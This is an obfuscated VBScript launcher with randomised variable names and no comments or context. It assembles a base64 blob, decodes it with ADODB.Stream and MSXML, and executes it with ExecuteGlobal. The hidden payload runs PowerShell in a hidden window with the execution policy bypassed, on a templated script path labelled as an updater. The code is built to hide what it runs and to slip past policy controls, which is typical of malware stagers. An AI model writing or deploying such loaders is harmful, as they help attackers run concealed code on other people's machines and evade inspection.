Dim xolpbrsj
xolpbrsj = ""
xolpbrsj = xolpbrsj & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbABsAC"
xolpbrsj = xolpbrsj & "wAIABzAEMAbQBkAAoAUwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBP"
xolpbrsj = xolpbrsj & "AGIAagBlAGMAdAAoACIAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkACgBzAEMAbQ"
xolpbrsj = xolpbrsj & "BkACAAPQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8A"
xolpbrsj = xolpbrsj & "ZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBXAGkAbgBkAG"
xolpbrsj = xolpbrsj & "8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABv"
xolpbrsj = xolpbrsj & "AGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACIAIgAlACUAVQBQAEQAQQ"
xolpbrsj = xolpbrsj & "BUAEUAUgBfAFAAUwAxAF8AUABBAFQASAAlACUAIgAiACIACgBvAFMAaABlAGwAbAAuAFIA"
xolpbrsj = xolpbrsj & "dQBuACAAcwBDAG0AZAAsACAAMAAsACAAVAByAHUAZQAKAFMAZQB0ACAAbwBTAGgAZQBsAG"
xolpbrsj = xolpbrsj & "wAIAA9ACAATgBvAHQAaABpAG4AZwA="
Dim dxwhncpn : Set dxwhncpn = CreateObject("ADODB.Stream")
dxwhncpn.Type = 1 : dxwhncpn.Open
Dim tfjwexzw : Set tfjwexzw = CreateObject("MSXml2.DOMDocument").createElement("z")
tfjwexzw.dataType = "bin.base64" : tfjwexzw.text = xolpbrsj
dxwhncpn.Write tfjwexzw.nodeTypedValue
dxwhncpn.Position = 0 : dxwhncpn.Type = 2 : dxwhncpn.Charset = "UTF-16LE"
Dim yxwxutjg : yxwxutjg = dxwhncpn.ReadText : dxwhncpn.Close
ExecuteGlobal yxwxutjg